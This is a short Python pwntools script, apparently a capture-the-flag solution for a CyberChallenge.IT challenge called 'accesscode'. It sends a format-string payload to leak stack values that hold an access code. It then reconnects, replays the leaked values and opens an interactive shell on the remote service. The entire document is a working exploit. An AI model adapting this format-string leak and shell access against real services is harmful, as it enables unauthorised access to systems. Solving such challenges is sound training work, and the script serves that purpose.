from pwn import *

HOST = "accesscode.challs.cyberchallenge.it"
PORT = 6022
p = remote(HOST, PORT)

print("\n[+] Exploiting...")
p.recvuntil("XOR is ")

payload = f"%18$lx %19$lx".encode()  # crafting the payload to leak the value of access code
p.sendline(payload)

p.recvuntil("Your input: ")

line = p.recvline()[:-1]  # saving the result of leaked value

p = remote(HOST, PORT)
p.sendline(line)  # I send the previously leaked values to access to shell
p.interactive()
